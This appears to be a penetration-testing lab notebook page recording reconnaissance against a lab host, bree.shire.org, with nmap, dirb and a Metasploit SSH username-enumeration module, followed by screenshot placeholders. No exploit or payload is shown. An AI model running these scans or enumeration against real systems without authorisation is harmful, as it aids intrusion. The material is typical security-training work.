# Target 2: bree.shire.org

## Target 1.2: bree.shire.org

```
nslookup bree.shire.org 10.0.5.22
# IP is 10.0.5.32
nmap -sV 10.0.5.32
dirb http://10.0.5.32 -wfr
# start metasploit
msf6 > search openssh
msf6 > use auxiliary/scanner/ssh/ssh_enumusers
msf6 auxiliary(scanner/ssh/ssh_enumusers) > options
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 10.0.5.32
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /home/champuser/Desktop/target2/users.txt
msf6 auxiliary(scanner/ssh/ssh_enumusers) > run
```

### Activity on bios.shire.org

```
ls -al 
```

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
